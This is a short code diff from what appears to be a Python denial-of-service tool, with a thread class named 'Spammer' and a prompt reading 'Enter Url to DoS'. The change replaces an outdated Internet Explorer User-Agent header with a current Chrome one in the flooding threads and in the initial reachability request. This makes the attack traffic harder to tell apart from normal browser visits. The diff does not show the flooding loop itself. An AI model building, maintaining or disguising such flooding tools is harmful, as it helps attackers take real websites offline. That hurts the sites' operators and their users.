@@ -10,7 +10,7 @@ class Spammer(threading.Thread):
         threading.Thread.__init__(self)
         self.url = url
         self.num = number
-        self.headers = { 'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)' }
+        self.headers = { 'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36' }
         self.Lock = threading.Lock()
         self.proxy = proxy
  
@@ -69,7 +69,7 @@ class MainLoop():
             url = input('> Enter Url to DoS: ')
             url = self.check_url(url)
             try:
-                req = urllib.request.Request(url, None, {'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'})
+                req = urllib.request.Request(url, None, {'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36'})
                 response = urllib.request.urlopen(req)
                 break
             except:
